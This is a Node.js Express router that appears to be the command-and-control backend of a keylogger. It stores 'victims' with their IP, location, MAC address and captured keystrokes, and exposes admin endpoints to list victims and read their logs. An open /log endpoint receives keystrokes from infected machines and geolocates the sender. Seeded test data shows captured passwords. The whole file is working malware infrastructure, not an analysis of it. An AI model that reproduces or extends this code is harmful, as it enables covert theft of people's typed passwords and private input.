var path = require('path');
var express = require('express');
var router = express.Router();
var request = require('request');

const config = require('../config');

// set up database
const Sequelize = require('sequelize');

const sequelize = new Sequelize(config.db.database, config.db.username, config.db.password, {
  host: config.db.host,
  dialect: config.db.dialect,
  storage: config.db.sqliteFile
});

const Victim = sequelize.import(path.join(__dirname, '../models/victim'));
const Log = sequelize.import(path.join(__dirname, '../models/log'));
Victim.Logs = Victim.hasMany(Log, {
  foreignKey: {
    allowNull: false
  }
});

sequelize.sync({
  force: true
})
.then(()=> {
  console.log("Set up database successfully");
  // TODO: remove test-case
  victim = Victim.create({
    ip: '39.136.14.94',
    country: 'Austria',
    region: 'Vienna',
    city: 'Vienna',
    macAdress: 'aa-aa-aa-aa-aa-aa',
    os: 'linux',
    logs: [
      { keystrokes: "asdf" },
      { keystrokes: "jklö" },
      { keystrokes: "password" },
      { keystrokes: "123passwd321" },
    ]
  }, {
    include: Victim.Logs
  });
})


/**
 * @apiDefine Auth Authentication is needed for this API
 * Specify API keys in config.js file. Call the API either with the 'X-API-KEY' header,
 * 'apikey' in the querystring or 'apikey' in body (POST).
 * 
 * @apiParam {String} apikey Mandatory, but only once; either this or by using headers
 * @apiHeader {String} X-API-KEY Mandatory, but only once; either this or by using querystring
 * @apiError Unauthorized
 */
router.use('/victims', (req, res, next) => {
    // grab api key from various request methods
    var apikey = req.header('X-API-KEY') || req.query.apikey || req.body.apikey;

    if(config.api.keys.indexOf(apikey) >= 0){
      next();
    } else{
      res.status(403).json({error: "unauthorized"})
    }
  });

/**
 * @api {get} /api/victims Request listing of vicitms
 * @apiName GetAllVictims
 * @apiGroup Victims
 * 
 * @apiUse Auth
 * @apiPermission Admin
 * 
 * @apiSuccess {Array} victims victims which are already tracked
 */
router.get('/victims', (req, res) => {
  Victim.all()
    .then(victims => {
        res.json(victims);
    });
});

/**
 * @api {get} /api/victims/:id Request attributes from specific victim
 * @apiName GetVictim
 * @apiGroup Victims
 * 
 * @apiUse Auth
 * @apiPermission Admin
 * 
 * @apiParam {Number} id Victims unique id
 * @apiSuccess {Victim} victim single victim which is already tracked
 */
router.get('/victims/:id', (req, res) => {
  Victim.findById(req.params.id).then(victim => {
    if(victim == null)
      res.status(404).json({error: "not found"});
    else
      res.json(victim);
  });
});

/**
 * @api {get} /api/victims/:id Request attributes from specific victim
 * @apiName GetVictim
 * @apiGroup Victims
 * 
 * @apiUse Auth
 * @apiPermission Admin
 * 
 * @apiParam {Number} id Victims unique id
 * @apiSuccess {Victim} victim single victim which is already tracked
 */
router.get('/victims/:id/logs', (req, res) => {
  Victim.findById(req.params.id).then(victim => {
    if(victim == null)
      res.json({error: "not found"});
    else
      victim.getLogs().then(associatedLogs =>{
        res.json(associatedLogs);
      });
  });
});

/**
 * @api {post} /api/log Log the keystrokes
 * @apiName AddKeystrokes
 * @apiGroup Log
 * 
 * @apiPermission None
 * 
 * @apiParam {MACAddress} string Victims MAC
 * @apiParam {keystrokes} string keystrokes which have been tracked
 */
router.post('/log', (req, res) => {
  var ip = req.connection.remoteAddress;
  // FIXME: rem default ip
  ip = "212.152.179.113";
  var useragent = req.headers['user-agent'];
  var macAdress = req.body.macAdress;

  request.get('http://ip-api.com/json/' + ip, (error, response, body) => {
    if (!error && response.statusCode == 200) {
      var ipInfo = JSON.parse(body);

      if(ipInfo.status == 'fail')
        res.status(400).json({ error: ipInfo.message })
      else {
        // TODO: insert in database
        console.log(ip, useragent, ipInfo)

        res.json({ip, useragent, ipInfo})
      }
    }
  })
});
module.exports = router;
